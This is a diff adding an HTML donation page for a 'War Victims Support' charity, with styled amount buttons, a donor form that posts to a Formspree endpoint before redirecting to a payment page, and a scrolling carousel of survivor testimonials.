@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Donate | War Victims Support</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet"/>
+  <link rel="shortcut icon" href="/assets/logo4.png" type="image/webp" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #f7faff;
+      color: #333;
+      padding: 40px 20px;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: auto;
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 30px;
+      color: #004080;
+      margin-bottom: 10px;
+    }
+
+    p.subtext {
+      text-align: center;
+      font-size: 16px;
+      margin-bottom: 30px;
+      color: #666;
+    }
+
+    .amount-options {
+      display: flex;
+      max-width: 1200px;
+      flex-direction: row;
+      /* flex-wrap: wrap; */
+      gap: 12px;
+      /* justify-content: center; */
+      /* align-items: center; */
+      margin-bottom: 20px;
+    }
+
+    .amount-options button {
+      padding: 12px 24px;
+      font-size: 16px;
+      border: 2px solid #004080;
+      background: white;
+      color: #004080;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .amount-options button.active,
+    .amount-options button:hover {
+      background: #004080;
+      color: white;
+    }
+
+    input[type="number"], input[type="email"], input[type="text"] {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+    }
+
+    textarea{
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+    textarea{
+      resize: none;
+    }
+
+
+    .form-group label {
+      font-weight: 500;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .donate-btn {
+      width: 100%;
+      background-color: #004080;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .donate-btn:hover {
+      background-color: #0056b3;
+    }
+
+    .testimonial-carousel {
+  overflow: hidden;
+  width: 100%;
+  background-color: #f8faff;
+  padding: 40px 0;
+  position: relative;
+}
+
+.testimonial-track {
+  display: flex;
+  flex-wrap: nowrap; /* ⛔️ prevent wrapping */
+  animation: scrollTestimonials 60s linear infinite;
+  width: max-content;
+}
+
+.testimonial-carousel:hover .testimonial-track {
+  animation-play-state: paused;
+}
+
+.testimonial {
+  flex: 0 0 auto;
+  width: 280px;
+  margin: 0 16px;
+  font-size: 14px;
+  padding: 20px;
+  background: #e6f0ff;
+  border-left: 4px solid #004080;
+  border-radius: 10px;
+  min-height: 120px;
+  opacity: 0.7;
+  transition: opacity 0.5s ease;
+}
+
+.testimonial:hover {
+  opacity: 1;
+}
+
+.testimonial p {
+  font-style: italic;
+  margin-bottom: 10px;
+}
+
+.testimonial span {
+  display: block;
+  text-align: right;
+  color: #004080;
+  font-weight: 600;
+}
+
+@keyframes scrollTestimonials {
+  0% {
+    transform: translateX(0%);
+  }
+  100% {
+    transform: translateX(-50%);
+  }
+}
+
+/* ✅ Mobile support (keep horizontal layout working properly) */
+@media (max-width: 768px) {
+  .testimonial-track {
+    width: max-content;
+    flex-wrap: nowrap;
+  }
+
+  .testimonial {
+    width: 250px; /* Smaller width on smaller screens */
+    margin: 0 10px;
+  }
+
+  .testimonial-carousel {
+    padding: 20px 0;
+  }
+}
+
+
+    @media (max-width: 600px) {
+      .amount-options {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Donate to Save Lives</h1>
+    <p class="subtext">Every dollar you give brings us closer to reuniting families and supporting survivors.</p>
+
+    <form id="myform" >
+      
+      <div class="amount-options">
+        <button type="button" onclick="selectAmount(500)">$500</button>
+        <button type="button" onclick="selectAmount(700)">$700</button>
+        <button type="button" onclick="selectAmount(850)">$850</button>
+        <button type="button" onclick="selectAmount(1000)">$1000</button>
+        <button type="button" onclick="selectAmount(2000)">$2000</button>
+      </div>
+
+      <div class="form-group">
+        <label for="amount">Custom Amount ($)</label>
+        <input type="number" id="amount" name="amount" placeholder="Enter custom amount" required min="1" />
+      </div>
+
+      <div class="form-group">
+        <label for="name">Your Full Name</label>
+        <input type="text" id="name" name="name" placeholder="Jane Doe" required />
+      </div>
+
+      <div class="form-group">
+        <label for="email">Your Email</label>
+        <input type="email" id="email" name="email" placeholder="you@example.com" required />
+      </div>
+        <div class="form-group">
+            <label for="message">Send Your Message of Support</label>
+            <textarea id="message" name="message" rows="4" placeholder="Your message of support..."></textarea>
+      </div>
+
+      <button type="submit" class="donate-btn" onclick="goToDonatePayment()">Donate Now</button>
+
+    </form>
+
+    <div class="testimonial-carousel">
+      <div class="testimonial-track">
+        <!-- Original Testimonials -->
+        <div class="testimonial"><p>“Thanks to your support, I was reunited with my family after months apart. I will never forget the kindness.”</p><span>– Mariam, Ukraine</span></div>
+        <div class="testimonial"><p>“The food and shelter saved our lives during the worst winter of the war. We are deeply grateful.”</p><span>– Omar, Syria</span></div>
+        <div class="testimonial"><p>“I lost everything in the bombing, but the aid helped me rebuild my home and my hope.”</p><span>– Amina, Gaza</span></div>
+        <div class="testimonial"><p>“Your volunteers held my hand when I felt alone. That gesture meant the world to me.”</p><span>– Fatima, Sudan</span></div>
+        <div class="testimonial"><p>“My children can go to school again, thanks to your educational support.”</p><span>– Hassan, Yemen</span></div>
+        <div class="testimonial"><p>“The mental health care you gave me changed my life after the trauma I faced.”</p><span>– Laila, Afghanistan</span></div>
+    
+        <!-- Duplicates for seamless loop -->
+        <div class="testimonial"><p>“Thanks to your support, I was reunited with my family after months apart. I will never forget the kindness.”</p><span>– Mariam, Ukraine</span></div>
+        <div class="testimonial"><p>“The food and shelter saved our lives during the worst winter of the war. We are deeply grateful.”</p><span>– Omar, Syria</span></div>
+        <div class="testimonial"><p>“I lost everything in the bombing, but the aid helped me rebuild my home and my hope.”</p><span>– Amina, Gaza</span></div>
+        <div class="testimonial"><p>“Your volunteers held my hand when I felt alone. That gesture meant the world to me.”</p><span>– Fatima, Sudan</span></div>
+        <div class="testimonial"><p>“My children can go to school again, thanks to your educational support.”</p><span>– Hassan, Yemen</span></div>
+        <div class="testimonial"><p>“The mental health care you gave me changed my life after the trauma I faced.”</p><span>– Laila, Afghanistan</span></div>
+      </div>
+    </div>
+    
+    
+  </div>
+
+  <script>
+
+
+
+
+
+
+
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("myform");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form reload
+
+      const formData = new FormData(form);
+      const jsonData = {};
+
+      formData.forEach((value, key) => {
+        jsonData[key] = value;
+      });
+
+      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "choose-payment.html"; // Redirect after submission
+        } else {
+          alert("Payment Details Submission failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        alert("An error occurred while Submitting.");
+      });
+    });
+  });
+
+
+    
+    function selectAmount(value) {
+      document.getElementById("amount").value = value;
+      const buttons = document.querySelectorAll(".amount-options button");
+      buttons.forEach(btn => btn.classList.remove("active"));
+      event.target.classList.add("active");
+    }
+  
+    function goToDonatePayment() {
+      const amount = document.getElementById("amount").value;
+      const email = document.getElementById("email").value;
+  
+      if (!amount || amount <= 0) {
+        alert("Please enter a valid donation amount.");
+        return;
+      }
+  
+      if (!email || !email.includes('@')) {
+        alert("Please enter a valid email.");
+        return;
+      }
+  
+      localStorage.setItem("donationAmount", amount);
+      localStorage.setItem("donorEmail", email);
+      // window.location.href = "donate-payment.html";
+    }
+  </script>
+  
+</body>
+</html>
